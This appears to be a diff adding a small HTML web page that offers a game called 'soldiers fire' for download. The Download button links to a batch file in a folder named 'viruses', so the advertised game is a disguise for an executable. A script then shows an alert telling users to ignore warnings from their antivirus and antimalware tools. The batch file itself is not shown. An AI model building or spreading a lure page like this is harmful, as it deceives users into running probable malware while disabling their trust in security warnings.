@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+   <meta charset="UTF-8">
+   <meta http-equiv="X-UA-Compatible" content="IE=edge">
+   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+   <title>Document</title>
+
+
+   <style>
+
+body{
+background-image:url(pictures/yash.jpg) ;
+background-repeat: no-repeat;
+background-size: 100rem;
+  }
+  ul{
+         list-style-type: none;
+         margin: 0;
+         padding: 0;
+         overflow: hidden;
+      background-color: #333;
+      }
+li{
+
+   float: left;
+}
+li a{
+display: block;
+color: white;
+text-align: center;
+padding: 14px 16px;
+text-decoration: none;
+
+}
+
+li a:hover:not(.activ ,.active ) {
+  background-color: red;
+}
+
+.activ {
+  background-color: #4CAF50;
+}
+.active{
+   background-color: #878683;
+}
+.bgcol{
+   background-color: #444444;
+   color: #ddd013;
+}
+.button{
+   font-size: x-large;
+     background-color: #0cad11; 
+     border-radius: 12px; 
+     color: #fff;
+}
+
+    </style>
+</head>
+<body>
+   <div>
+      <audio autoplay>
+         <source  src="hjj.mp3" >
+         <source src="hjj.mp3">
+        
+      </audio>
+   </div>
+   <div>
+      <ul>
+
+<li><a href="#" class="activ">Home</a></li>
+<li><a href="about.html"> About </a></li>
+<li><a href="contact.html">Contact</a></li>
+<li style="float:right "><a class="active" href="#">--ash </a></li>
+   </ul>
+</div>
+<br>
+   <div class="bgcol" style="text-align: center; margin-top: 25%;">
+   <h3>"hello there is yash developer of this website and this game"<br> <br> "I know you are waiting for this game since long so, now  you can easily download "soldiers fire". "
+  <br><br> "this is brand new game you can easily play this game. <br> <br> Instruction are given inside the installer"
+   </h3></div>
+   <div style="text-align: center;">
+<a href="viruses\Drag.bat" download > 
+<button class="button" >  Download   </button>
+</a>
+   </div>
+   <script>
+document.querySelector('.button').onclick = function(){
+   alert("after downloading it may say you it is harmfull for your computer, due to adblocker,antimalware,antivirus etc installed in your computer ignore all stuff . ")
+
+}
+
+   </script>
+</body>
+</html>
